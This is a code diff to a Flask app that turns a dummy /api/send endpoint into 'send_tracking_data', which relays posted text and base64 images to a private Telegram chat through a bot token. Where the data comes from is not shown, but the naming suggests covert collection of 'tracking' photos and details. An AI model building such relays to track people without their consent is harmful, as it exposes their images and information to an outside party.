@@ -12,6 +12,8 @@ import dotenv
 import os
 import fcntl
 import tempfile
+import base64
+import io
 
 app = Flask(__name__)
 
@@ -623,10 +625,61 @@ def queue_status():
 
 
 @app.route("/api/send", methods=["POST"])
-def dummy_send():
-    """Dummy endpoint for local testing (actual logic is in api/send.js for Vercel)"""
-    print("Local dummy /api/send called")
-    return jsonify({"success": True, "msg": "Dummy response from Flask"}), 200
+def send_tracking_data():
+    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
+    chat_id = os.getenv("TELEGRAM_CHAT_ID")
+
+    if not bot_token or not chat_id:
+        return jsonify({"error": "Missing bot_token or chat_id"}), 500
+
+    try:
+        data = request.json
+        data_type = data.get("type")
+
+        if data_type == "text":
+            text = data.get("text")
+            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+            payload = {"chat_id": chat_id, "text": text}
+            r = requests.post(url, json=payload)
+            return jsonify(r.json())
+
+        if data_type == "media":
+            media_list = data.get("media", [])
+            if not media_list:
+                return jsonify({"error": "No media provided"}), 400
+
+            url = f"https://api.telegram.org/bot{bot_token}/sendMediaGroup"
+            files = {}
+            media_payload = []
+
+            for i, item in enumerate(media_list):
+                base64_str = item.get("media")
+                if "," in base64_str:
+                    base64_str = base64_str.split(",")[1]
+                
+                image_data = base64.b64decode(base64_str)
+                file_key = f"photo{i}"
+                files[file_key] = (f"image{i}.jpg", io.BytesIO(image_data), "image/jpeg")
+                
+                media_payload.append({
+                    "type": "photo",
+                    "media": f"attach://{file_key}",
+                    "caption": item.get("caption", "") if i == 0 else ""
+                })
+
+            payload = {
+                "chat_id": chat_id,
+                "media": json.dumps(media_payload)
+            }
+            
+            r = requests.post(url, data=payload, files=files)
+            return jsonify(r.json())
+
+        return jsonify({"error": "Invalid data type"}), 400
+
+    except Exception as e:
+        print(f"Error in /api/send: {e}")
+        return jsonify({"error": str(e)}), 500
 
 
 if __name__ == "__main__":
